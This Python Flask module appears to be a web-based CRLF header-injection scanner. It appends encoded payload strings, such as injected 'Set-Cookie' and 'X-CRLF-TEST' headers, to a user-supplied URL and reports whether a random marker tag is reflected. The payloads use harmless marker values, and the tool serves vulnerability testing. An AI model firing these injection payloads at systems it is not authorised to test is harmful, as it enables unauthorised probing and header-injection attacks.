from flask import Blueprint, request, jsonify, send_from_directory
import requests
import random
import string
import urllib.parse
from datetime import datetime
import os

crlf_bp = Blueprint('crlf_bp', __name__)

# Disable SSL verify warnings in console
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def rand_tag(n=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

# Payload templates...
PAYLOAD_TEMPLATES = [
    "%0d%0aX-CRLF-TEST: {tag}",
    "%0d%0aSet-Cookie: crlf_test={tag}",
    "%0d%0aX-Injected: {tag}",
    "%0aX-CRLF-TEST: {tag}",
    "%0d%0aX-CRLF-TEST:%20{tag}",
    "%250d%250aX-CRLF-TEST:%20{tag}",
]

RAW_TEMPLATES = [
    "\r\nX-CRLF-TEST: {tag}",
    "\nX-CRLF-TEST: {tag}"
]

def build_payloads(tag):
    payloads = []
    for t in PAYLOAD_TEMPLATES:
        payloads.append(t.format(tag=tag))
    for t in RAW_TEMPLATES:
        payloads.append(urllib.parse.quote(t.format(tag=tag), safe=''))
    return payloads

@crlf_bp.route("/", methods=["GET"])
def serve_ui():
    folder_path = os.path.dirname(os.path.abspath(__file__))
    return send_from_directory(folder_path, "index.html")

@crlf_bp.route("/crlf-test", methods=["POST"])
def crlf_test():
    data = request.get_json() or {}
    target = (data.get("url") or "").strip()
    confirm = data.get("confirm", False)
    timeout = float(data.get("timeout", 8))

    if not confirm:
        return jsonify({"error": "Explicit confirmation required. Set 'confirm': true to proceed."}), 400

    if not target or "=" not in target:
        return jsonify({"error": "Provide a target URL with a parameter position, e.g. http://example.com/page?param="}), 400

    run_id = rand_tag(8)
    tag = f"crlf-{rand_tag(6)}"
    payloads = build_payloads(tag)

    results = []
    baseline = None

    try:
        rbase = requests.get(target, timeout=timeout, verify=False)
        baseline = {
            "status_code": rbase.status_code,
            "headers": dict(rbase.headers),
            "body_snippet": rbase.text[:800]
        }
    except Exception as e:
        baseline = {"error": f"Baseline fetch error: {str(e)}"}

    for p in payloads:
        test_url = target + p
        attempt = {"payload": urllib.parse.unquote(p), "test_url": test_url, "time": datetime.utcnow().isoformat()}
        try:
            r = requests.get(test_url, timeout=timeout, verify=False, allow_redirects=False)
            headers = dict(r.headers)
            body_snippet = r.text[:2000] if r.text else ""

            lowered = {k.lower(): v for k, v in headers.items()}
            found_headers = []
            for hk, hv in lowered.items():
                if tag in str(hv):
                    found_headers.append({"header": hk, "value": hv})
            if "set-cookie" in lowered and tag in lowered["set-cookie"]:
                found_headers.append({"header": "set-cookie", "value": lowered["set-cookie"]})

            body_reflection = tag in body_snippet

            vulnerable = bool(found_headers) or body_reflection

            attempt.update({
                "status_code": r.status_code,
                "headers": headers,
                "found_headers": found_headers,
                "body_reflected": body_reflection,
                "body_snippet": body_snippet,
                "vulnerable": vulnerable
            })
        except Exception as e:
            attempt.update({
                "error": str(e),
                "vulnerable": False
            })
        results.append(attempt)

    positives = [r for r in results if r.get("vulnerable")]

    return jsonify({
        "run_id": run_id,
        "tag": tag,
        "target": target,
        "baseline": baseline,
        "results_count": len(results),
        "positives_count": len(positives),
        "positives": positives,
        "all_results": results
    })
